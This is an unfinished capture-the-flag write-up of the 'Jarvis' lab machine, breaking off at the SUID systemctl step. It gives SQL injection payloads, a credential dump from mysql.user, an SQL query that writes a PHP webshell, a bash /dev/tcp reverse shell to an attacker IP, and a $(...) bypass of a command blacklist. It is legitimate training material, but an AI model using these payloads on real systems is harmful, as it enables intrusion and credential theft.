Tools:
Nikto: An open source web-scanner that detects a variety of vulnerabilities
Bandit: A static analysis tool used to scan source code for vulnerabilities


Summary:
Jarvis was a machine that exercised classic exploits such as SQL injection and command injection in programs, as well as SUID abuse. Exploit begins with a port scan finding HTTP running on port 80, which is a website for booking rooms at Stark Hotel. Finding a room description page uncovers a SQL injection vulnerability, which when enumerated properly will reveal a credential set for the phpmyadmin page. Logging in allows the attacker to execute arbitrary SQL commands, which leads to a backdoor being created on a subpage of the website. 
Connecting through the page opens a reverse shell as www-data, however, this account cannot read user.txt. There is another user, pepper, that can owns it. Runnning standard enumeration commands shows that www-data can run a python program named simpler.py as the user pepper. The program takes input for a ping command and uses a blacklist to prevent execution of other commands, however, it fails to account for the use of $(/bin/bash), which allows a shell as pepper to open. The user.txt is captured. 
Finally, /bin/systemctl has a SUID bit set. By creating a reverse shell in the form of a service, systemctl can be used to start the service. By doing this, a reverse shell is returned as the root user.





SCREENSHOT OF WEBPAGE HOME

Navigating to http://10.10.10.143/ shows a hotel's homepage. Clicking on the preview images of the hotel rooms leads to /room.php.

SCREENSHOT OF ROOM.PHP

The parameter in the URL, ?cod=, points to a possible SQL injection. This is confirmed by utilizing a time-based SQL injection. Entering ?cod=1 AND if(1=1, sleep(10), false) causes the output to delay returning for 10 seconds, which confirms that the field is indeed injectable. ADD FIGURE NUMER!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

SCREENSHOT OF ORDER BY THAT IS CORRECT

To begin enumerating the database, "?cod=1 ORDER BY 2" is used to test the number of columns in the table (Figure 3). Since the output is normal, the injection is incremented by 1, "?cod=1 ORDER BY 3". 

SCREENSHOT OF ORDER BY 8 BREAKING OUTPUT 

This is continued until "ORDER BY 8" returns nothing (Figure 4). This shows that the table being queried in this page has 7 columns.   

SCREENSHOT OF UNION ALL SELECT 1 -> 7

Now, the columns which display information to the page must be isolated. Entering "?cod=0 UNION ALL SELECT 1,2,3,4,5,6,7" will cause the room page to show that columns 2, 3, 4, and 5 are reflected in the output on the page (Figure 5). 5 seems to be the room's image, 2 is the name of the room, 3 is the price per night, and 4 is the description of the room. Columns 1, 6, and 7 are not shown in the output. 

This means that columns 2 through 5 are usable for outputting more sensitive information. 

SCREENSHOT OF @@VERSION

Before moving further, the database version and type must be enumerated. Using @@version in one of the columns returns 10.1.37-MariaDB-0+deb9u1 as the database (Figure 6). 

SCREENSHOT OF SELECTING MYSQL.USER TABLE INFO

To read credentials, "?cod=0 UNION ALL SELECT 1, user, 3, password,@@version,6,7 FROM mysql.user" is used to output the username and hashed password of the entries in the users table (Figure 7). This returns the username: DBadmin, a hashed password, and the version.


SCREENSHOT OF CRACKSTSTION

Next, the hash is cracked using crackstation.net and returns "imissyou" as the result (Figure 8). The credentials are DBadmin:imissyou. 


SCREENSHOT OF PHPMYADMIN

Running a Nikto scan finds /phpmyadmin page in its scan (Figure 9), and DBadmin:imissyou works for logging into it. 



SCREENSHOT OF SQL QUERY


Using â€œSQL" tab at top of phpMyAdmin, the following query is entered (Figure 10): 
        SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/backdoor.php";
This command creates a file named backdoor.php in the /var/www/html/ directory on the Jarvis machine. The file is populated with a simple PHP webshell that should give command execution capabilities. Selecting "Go" executes the query and creates the backdoor. 


SCREENSHOT OF BACKDOOR

Going to http://10.10.10.143/backdoor.php?cmd= allows commands to be issued. Entering <CODE>uname -a<CODE> after the "=" returns the output (Figure 11), confirming that commands are successfully executing. 


FIGURE 12

Entering <CODE>bash -i >& /dev/tcp/10.10.15.245/11223 0>&1<CODE> into cmd field of the webshell causes a reverse shell to be created with a listening attacker machine (Figure 12). Once a connection is created, python is used to upgrade to a TTY shell. The user is www-data. 


FIGURE 13

Looking at the home directory of the machine, there is only one user: pepper. Her directory contains the user.txt flag, but it is unreadable by www-data (Figure 13) 


FIGURE 14

In order to read user.txt, the pepper account must be compromised. <CODE>sudo -ll<CODE> is used to view sudo permissions for the current user. The output of this shows exactly what will be needed. www-data can run a python script named simpler.py as pepper (Figure 14), so if the script can be exploited, then a shell can be granted as pepper. 


Figure 15

Using <CODE>cat /var/www/Admin-Utilities/simpler.py<CODE> shows the content of the program. Depending on the flag given to the program, it performs a different function. The functionality includes reading a log from pepper's home directory, listing attacker IPs, and pinging an IP. However, reading the code shows that the exec_ping() function executes an operating system command. This immediately hints at command injection as a route of exploit. This is further confirmed by copying the code to the attacking machine and using Bandit, a static application security 



Python script on machine is able to ping targets, but bandit identifies a vulnerability in its code in allowing input to be executed

Script has a blacklist of: &  ;  -  `  ||  | 

Trying to either a) escape/encode operator, or b) find one that the program will accept. 

Python script can be bypassed by inputting $(COMMAND) into the ping prompt. 

Command: sudo -u pepper /var/www/Admin-Utilities/simpler.py -p 
                $(/bin/bash)
                
Shell granted as pepper 

Pepper can execute /bin/systemctl with the SUID bit.
